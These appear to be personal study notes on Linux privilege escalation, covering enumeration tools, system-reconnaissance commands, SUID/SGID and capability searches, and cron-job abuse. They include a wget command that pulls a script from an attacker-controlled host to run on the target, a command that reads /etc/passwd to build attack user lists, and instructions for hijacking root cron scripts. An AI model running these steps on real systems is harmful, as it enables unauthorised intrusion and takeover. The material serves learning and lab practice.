### General Notes

Going from a lower permission account to a higher permission one.
- Exploiting a vulnerability, design flaw, or configuration oversight in an OS or application to gain access to resources.

> Gives you admin access and privileges to:
1. Reset passwords.
2. Bypass access controls.
3. Edit software configurations.
4. Enabling persistence. [[Backdoors]].
5. Changing the privilege of existing users.
6. Execute any admin command.

> [GTFOBins](https://gtfobins.github.io/) used to escalate privileges based on binaries available.

---
### Automated Enumeration Tools

* [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).
* [LinEnum](https://github.com/rebootuser/LinEnum).
* [LES](https://github.com/mzet-/linux-exploit-suggester).
* [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration).
* [Linux Priv Checker](https://github.com/linted/linuxprivchecker).

> To send any of these scripts to a target machine, spawn a python server on the attacking machine where the script is:
```bash
python -m http.server 80
```

> Then `wget` the script.
```shell
wget http://<attacker-ip>:80/<scriptname.sh>
```

> Before running the script, give it first execute permissions then run it.

```shell
chmod +x <scriptname.sh>
./scriptname.sh
```

#### Enumeration

##### Hostname
> The hostname of a machine can give useful information about its role within the network.
```bash
hostname
```
##### Kernel Information
> The command gives us information regarding the kernel to be used to search for vulnerabilities.
```shell
uname -a
```
##### Proc filesystem (procfs)
> The proc fileststem (procfs) provides about the system's processes.
> Looking at `/proc/version` may give information on the kernel version and if compilers are installed.
```shell
cat /proc/version
```
##### Operating System Information
> Looking at the `/etc/issue` gives information about the operating system.
```shell
cat /etc/issue
```
##### Running Processes
> Running the command `ps` gives information about the currently running processes on the system.
1. Views all running processes.
```shell
ps -A
```
2. View process tree.
```shell
ps axjf
```
3. Processes for all users (a), as well as the user that launched each process(u), and processes not attached to a terminal(x).
```shell
ps aux
```
##### Environment Variables
 > The `env` command can be used to show the environment variables.
 > The `PATH` variable could have a compiler or scripting language that we can use to run code or escalate privileges with.
```shell
env
echo $PATH
 ```
##### `sudo -l`
> Command used to list the commands that the current user can run using `sudo`.
##### Listing hidden files
> Listing hidden files can show secret files, or [[Secure Shell Protocol (SSH)]] folders and keys.
```Shell
ls -lah
```
##### Current user
> `id` command can be used to show the current user's privilege level and groups.
```shell
id <username>
```
##### `/etc/passwd`
> Reading this file can help discover the users on a system.
> Opening it and piping its contents can be used to create lists for attacks.
```shell
cat /etc/passwd | cut -d ":" -f 1
```
> To get only the users that are present in the `/home` directory use the `grep` command.
```shell
cat /etc/passwd | grep home
```
##### Command history
> The `history` command can be used to look at previous commands which could give us information about the system, and could store information such as usernames/passwords.
##### Network Interfaces
> The system might be pivoting, or connecting to another network.
> The `ifconfig` command gives us information about the network interfaces of the system.
> Use the command `ip route` to see the network routes that exist that we can reach. [[Networking/Routing|Routing]].

> Can use the `netstat` command to check for existsing interfaces and routes.
1. To see all listening [[Port]]s and connections.
```shell
netstat -a
```
2. To see TCP/UDP [[Protocol]]s.
```shell
netstat -at
netstat -au
```
3. To list the listening ports. Can be combined with `t` or `u` for TCP/UDP.
```shell
netstat -l
netstat -lt
netstat -lu
```
4. List connections with service names and process information. Can be combined with `l` for ports.
```shell
netstat -tp
netstat -tpl
```
5. Network statistics for each interface.
```shell
netstat -i
```
##### `find`
> Searching the system for specific files. [Guide](https://pimylifeup.com/find-command/).
1. Search in the given directory for `<file-name>`.
```shell
find /<directory> -name <file-name>
```
2. Searching for directory `<directory-name>` 
```shell
find / -type d -name <directory-name>
```
3. Searching for files with given permissions `0777`. (readable,writable,executable by all).
```shell
find / -type f -perm 0777
```
4. Searching for executable files.
```shell
find / -perm a=x
```
5. Searching for all files under the directory `<directory-name>` for user `<username>`.
```shell
find /<directory-name> -user <username>
```
6. Searching for world-writeable folders.
```shell
find / -writable -type d 2>/dev/null | cut -d "/" -f 2 | sort -u
find / -perm 222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null
```
7. Searching for world-executable folders.
```shell
find / -perm -o x -type d 2>/dev/null
```
8. Searching for development tools and languages.
```shell
find / -name perl*
find / -name python*
find / -name gcc*
```

---
### Using SUID and SGID bits

> These bits when set, allow files to be executed with the permission level of the file owner or the group owner.
> They will have an `s` in their special permission level.

```shell
find / -type f -perm -04000 -ls 2>/dev/null
```
> To list the files that have SUID or SGID bits set.
> Then heading to [GTFOBins](https://gtfobins.github.io/) to compare.

---
### Capabilities

> Increases the privilege level of a binary.

```shell
getcap -r / 2>/dev/null
```
> To get the set capabilities on a system.
> Then heading to  [GTFOBins](https://gtfobins.github.io/) to compare.

---
### Cron Jobs

> Used to run scripts and binaries at specific times.
> They run with the privilege of their owner.

> Cron Job configuration is stored in crontabs, or Cron Tables in which the dates and times of rerunning are written.
```shell
cat /etc/crontab
```

> If there is a script being run with root privileges and we can change that script to a script we choose, then we can run this script with root privileges. [[Reverse Shells]].
> If there is a script set to run but it has been deleted, but the cron job itself still exists. We can create our own file and place it somewhere in the PATH variable in the `/etc/crontab` file so that it is executed.

---
